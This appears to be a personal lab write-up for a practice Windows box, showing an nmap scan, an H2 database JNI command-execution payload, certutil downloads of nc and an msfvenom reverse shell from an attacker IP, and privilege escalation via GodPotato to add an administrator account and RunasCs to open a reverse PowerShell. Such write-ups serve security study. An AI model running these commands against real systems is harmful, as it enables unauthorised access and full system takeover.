# Jacko \[Inter]

## Report

H2 fatabase is vulnerable to JNI code execution which allows us to execute commands via 'cmd'. Powershell is not available so reverse shell either via nc64.exe or msfvenom.

User 'tony' has SeImpersonate but PrintSpoofer fumbled yet again. GodPotato though proividing a dead shell can be used to add a new user as administrator and RunasCs can be used to spawn a new shell as that user (jtrip)

## Enumeration

192.168.223.66

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods: 
|_  Supported Methods: GET POST
9092/tcp  open  XmlIpcRegSvc?
```

H2 1.4.199 (2019-03-13)

{% embed url="https://www.exploit-db.com/exploits/49384" %}

### Files

None

### Initial Foothold

{% code overflow="wrap" %}
```
certutil -urlcache -f http://192.168.45.187/nc64.exe nc.exe

msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.187 LPORT=8082

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.187/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\Z").next()');
```
{% endcode %}

## PrivEsc

Adding powershell and cmd to PATH

`set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`

```
SeImpersonate (PrintSpoofer DID NOT WORK)
.\GP.exe -cmd "net user /add jtrip jtrip"
.\GP.exe -cmd "net localgroup administrators jtrip /add"

PS C:\Users\tony> net user
User accounts for \\JACKO

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
jtrip                    tony                     WDAGUtilityAccount 

.\RunasCs.exe "jtrip" 'jtrip' powershell.exe -r 192.168.45.187:9001
```

## Loot

### Creds

None

### Flags

If only the stupid power didn't go off

## Proof

You kept using '\\' in certutil path which kind of messed up the SQL syntax when forward slashes work perfectly fine for directory traversal

Without mentioning the explicit full path, it was never going to work, the JNI is operating from its own directory right

Calm down, spending half an hour on a box is nothing - don't make getting frustrated take that to two hours
